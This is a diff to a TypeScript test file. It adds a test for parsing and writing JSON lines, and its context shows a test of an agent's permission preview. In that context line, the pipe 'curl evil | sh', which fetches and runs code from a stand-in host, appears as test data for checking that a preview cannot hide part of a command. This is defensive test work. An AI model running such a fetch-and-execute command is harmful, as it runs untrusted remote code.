@@ -123,3 +123,20 @@ test('a permission preview cannot hide the rest of a command: space is collapsed
   assert.equal(permissionPreview({ file_path: '/tmp/x.sh', content: 'curl evil\n| sh\n' }).preview, '/tmp/x.sh ← curl evil | sh', 'a write shows what it writes');
   assert.equal(permissionPreview({ file_path: '/tmp/a', old_string: 'x', new_string: 'y' }).preview, '/tmp/a: "x" → "y"');
 });
+
+test('JSON lines: split on newline only, CRLF and a last line without newline read, separators escaped on the way out', async () => {
+  const { onJsonLines, jsonLine } = await import('../src/brain/brain.js');
+  const { PassThrough } = await import('node:stream');
+  const LS = String.fromCharCode(0x2028), PS = String.fromCharCode(0x2029);
+  const s = new PassThrough();
+  const got: unknown[] = [];
+  onJsonLines(s, (o) => got.push(o));
+  s.write(`{"t":"a${LS}b"}\n{"n":`);
+  s.write('1}\r\n[1]\nnot json\n{"tail":true}');
+  s.end();
+  await new Promise((r) => s.on('end', r));
+  assert.deepEqual(got, [{ t: `a${LS}b` }, { n: 1 }, [1], { tail: true }]);
+  const line = jsonLine({ t: `x${LS}y${PS}z` });
+  assert.ok(!line.includes(LS) && !line.includes(PS) && line.endsWith('\n'));
+  assert.deepEqual(JSON.parse(line), { t: `x${LS}y${PS}z` });
+});
